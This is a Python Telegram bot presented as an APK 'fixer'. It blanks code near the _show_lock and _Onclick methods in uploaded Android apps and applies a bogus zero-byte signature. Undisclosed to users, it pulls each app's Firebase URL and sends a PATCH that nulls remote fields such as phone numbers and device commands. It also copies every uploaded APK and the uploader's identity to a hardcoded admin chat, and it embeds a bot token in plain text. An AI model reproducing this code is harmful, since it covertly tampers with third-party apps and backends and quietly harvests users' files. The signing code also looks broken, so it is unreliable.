import os
import re
import html
import json
import time
import zipfile
import requests
import logging
import shutil
import tempfile
import hashlib
from threading import Thread
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Logging Setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)

# Configuration
BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
ADMIN_CHAT_ID = "6240110220"

DELETE_PAYLOAD = {
    "messageText": None,
    "phoneNumber": None,
    "simSlot": None,
    "new_user": None,
    "targetDeviceId": None,
    "command": None
}

# ===================== Health Check Server =====================

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        # Simple ASCII response - no special characters
        response = "OK - Bot is Running"
        self.wfile.write(response.encode())

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

def run_dummy_server():
    port = int(os.environ.get("PORT", 8080))
    server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
    server.serve_forever()

# ===================== APK Processing Functions =====================

def extract_apk(apk_path, extract_dir):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            zip_ref.extractall(extract_dir)
        return True
    except Exception as e:
        logging.error(f"APK Extraction Error: {e}")
        return False

def find_dex_files(extract_dir):
    dex_files = []
    for root, dirs, files in os.walk(extract_dir):
        for file in files:
            if file.endswith('.dex'):
                dex_files.append(os.path.join(root, file))
    return sorted(dex_files)

def find_method_in_binary(data, method_name):
    positions = []
    method_variants = [
        method_name.encode('utf-8'),
        method_name.encode('latin-1'),
        method_name.encode('ascii', errors='ignore'),
        f'.method public {method_name}'.encode(),
        f'.method private {method_name}'.encode(),
        f'->{method_name}('.encode(),
    ]
    for variant in method_variants:
        pos = data.find(variant)
        while pos != -1:
            positions.append(pos)
            pos = data.find(variant, pos + 1)
    return positions

def clear_methods_in_dex(dex_path):
    try:
        with open(dex_path, 'rb') as f:
            data = bytearray(f.read())
        
        if len(data) < 8 or data[:4] != b'dex\n':
            return False
        
        modified = False
        methods_to_clear = ['_show_lock', '_Onclick']
        
        for method in methods_to_clear:
            positions = find_method_in_binary(data, method)
            if positions:
                modified = True
                for pos in positions:
                    start = max(0, pos - 10)
                    end = min(len(data), pos + 120)
                    for i in range(start, end):
                        data[i] = 0x00
        
        if modified:
            with open(dex_path, 'wb') as f:
                f.write(data)
            return True
        return False
        
    except Exception as e:
        logging.error(f"DEX Error: {e}")
        return False

def process_all_dex_files(extract_dir):
    dex_files = find_dex_files(extract_dir)
    modified_count = 0
    for dex_file in dex_files:
        if clear_methods_in_dex(dex_file):
            modified_count += 1
    return modified_count

def repack_apk(extract_dir, output_path):
    try:
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(extract_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, extract_dir)
                    zipf.write(file_path, arcname)
        return os.path.exists(output_path) and os.path.getsize(output_path) > 0
    except Exception as e:
        logging.error(f"Repack Error: {e}")
        return False

def sign_apk(apk_path):
    try:
        temp_dir = tempfile.mkdtemp()
        
        with zipfile.ZipFile(apk_path, 'r') as zipf:
            zipf.extractall(temp_dir)
        
        meta_inf_dir = os.path.join(temp_dir, 'META-INF')
        os.makedirs(meta_inf_dir, exist_ok=True)
        
        manifest_path = os.path.join(meta_inf_dir, 'MANIFEST.MF')
        with open(manifest_path, 'w') as f:
            f.write("Manifest-Version: 1.0\n")
            f.write("Created-By: APK Bot\n")
        
        cert_sf_path = os.path.join(meta_inf_dir, 'CERT.SF')
        with open(cert_sf_path, 'w') as f:
            f.write("Signature-Version: 1.0\n")
            f.write("Created-By: APK Bot\n")
        
        cert_rsa_path = os.path.join(meta_inf_dir, 'CERT.RSA')
        with open(cert_rsa_path, 'wb') as f:
            f.write(b'\x00' * 512)
        
        new_apk = apk_path.replace('.apk', '_signed.apk')
        with zipfile.ZipFile(new_apk, 'w', zipfile.ZIP_DEFLATED) as new_zip:
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, temp_dir)
                    new_zip.write(file_path, arcname)
        
        if os.path.exists(new_apk):
            os.remove(apk_path)
            shutil.move(new_apk, apk_path)
            return True
        return False
        
    except Exception as e:
        logging.error(f"Signing Error: {e}")
        return False
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

def modify_apk(apk_path):
    temp_dir = tempfile.mkdtemp()
    modified_path = apk_path.replace('.apk', '_modified.apk')
    
    try:
        if not extract_apk(apk_path, temp_dir):
            return None
        
        modified_count = process_all_dex_files(temp_dir)
        logging.info(f"Modified {modified_count} DEX files")
        
        if not repack_apk(temp_dir, modified_path):
            return None
        
        sign_apk(modified_path)
        
        if os.path.exists(modified_path):
            return modified_path
        return None
        
    except Exception as e:
        logging.error(f"Modification Error: {e}")
        return None
    finally:
        try:
            shutil.rmtree(temp_dir)
        except:
            pass

def extract_firebase_url(apk_path):
    try:
        with zipfile.ZipFile(apk_path, 'r') as zip_ref:
            if 'resources.arsc' in zip_ref.namelist():
                content = zip_ref.read('resources.arsc')
                match = re.search(rb'https://[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*\.firebaseio\.com', content)
                if match:
                    return match.group(0).decode('utf-8')
    except Exception as e:
        logging.error(f"Extraction Error: {e}")
    return None

def delete_firebase_data(base_url):
    try:
        target_url = base_url.strip()
        if not target_url.endswith('/'):
            target_url += '/'
        if 'user_data.json' not in target_url:
            target_url += 'user_data.json'
        
        response = requests.post(target_url, json=DELETE_PAYLOAD, headers={
            'X-HTTP-Method-Override': 'PATCH',
            'Content-Type': 'application/json'
        }, timeout=15)
        return response.status_code == 200
    except Exception as e:
        logging.error(f"REST API Error: {e}")
        return False

# ===================== Bot Handlers =====================

user_stats = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    safe_name = html.escape(user.first_name)
    
    welcome = f"""👋 Welcome {safe_name}!

🚀 APK Processing Bot

📌 Send me any .apk file and I will:
• Clear _show_lock() method
• Clear _Onclick() method
• Sign the APK
• Send it back to you

⚡ Just upload your APK file!"""
    
    keyboard = [
        [
            InlineKeyboardButton("📢 Channel", url="https://t.me/+EERGF0ldJgcwODVl"),
            InlineKeyboardButton("💬 Support", url="https://t.me/AD_ASHU")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        text=welcome,
        parse_mode="HTML",
        reply_markup=reply_markup
    )

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    document = update.message.document
    user = update.effective_user
    user_id = str(user.id)
    
    if not document.file_name.endswith('.apk'):
        await update.message.reply_text("❌ Please send a valid .apk file")
        return
    
    status_msg = await update.message.reply_text("📥 Downloading APK...")
    file_path = f"temp_{document.file_id}.apk"
    modified_path = None
    
    try:
        file = await context.bot.get_file(document.file_id)
        await file.download_to_drive(file_path)
        
        original_size = os.path.getsize(file_path)
        await status_msg.edit_text(f"📊 Original: {original_size/1024/1024:.2f} MB\n🔧 Processing...")
        
        # Extract Firebase URL
        firebase_url = extract_firebase_url(file_path)
        
        # Modify APK
        modified_path = modify_apk(file_path)
        
        if modified_path is None or not os.path.exists(modified_path):
            await status_msg.edit_text("❌ Processing failed! Sending original APK.")
            modified_path = file_path
        
        modified_size = os.path.getsize(modified_path)
        
        # Update stats
        if user_id not in user_stats:
            user_stats[user_id] = {'count': 0, 'total_size': 0}
        user_stats[user_id]['count'] += 1
        user_stats[user_id]['total_size'] += modified_size
        
        # Delete Firebase data
        if firebase_url:
            delete_firebase_data(firebase_url)
        
        await status_msg.edit_text("✅ Processing complete! Sending file...")
        
        # Send modified APK
        caption = f"""✅ APK Processed Successfully!

📊 Size: {original_size/1024/1024:.2f}MB → {modified_size/1024/1024:.2f}MB
✅ Cleared: _show_lock() and _Onclick()
🔒 Signed: Yes

📤 Ready to install!"""
        
        with open(modified_path, 'rb') as apk_file:
            new_name = document.file_name.replace('.apk', '_fixed.apk')
            await update.message.reply_document(
                document=apk_file,
                filename=new_name,
                caption=caption,
                parse_mode="HTML"
            )
        
        # Send to admin
        admin_caption = f"""📥 New APK Processed

👤 User: {html.escape(user.full_name)}
🆔 ID: {user.id}
📊 Size: {original_size/1024/1024:.2f}MB → {modified_size/1024/1024:.2f}MB
✅ Status: Success"""
        
        with open(modified_path, 'rb') as admin_file:
            await context.bot.send_document(
                chat_id=ADMIN_CHAT_ID,
                document=admin_file,
                filename=document.file_name,
                caption=admin_caption,
                parse_mode="HTML"
            )
            
    except Exception as e:
        await status_msg.edit_text(f"❌ Error: {html.escape(str(e))}")
        
    finally:
        try:
            if os.path.exists(file_path) and file_path != modified_path:
                os.remove(file_path)
        except:
            pass

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_user.id) != ADMIN_CHAT_ID:
        await update.message.reply_text("❌ Unauthorized")
        return
    
    total_users = len(user_stats)
    total_processed = sum(s['count'] for s in user_stats.values())
    total_size = sum(s['total_size'] for s in user_stats.values())
    
    text = f"""📊 Bot Statistics

👥 Total Users: {total_users}
📦 Total Processed: {total_processed}
💾 Total Data: {total_size/1024/1024:.2f} MB
🕐 Status: Running"""
    
    await update.message.reply_text(text)

# ===================== Main =====================

if __name__ == '__main__':
    # Start health check server
    Thread(target=run_dummy_server, daemon=True).start()
    
    # Start bot
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    logging.info("🚀 Bot is starting...")
    app.run_polling()
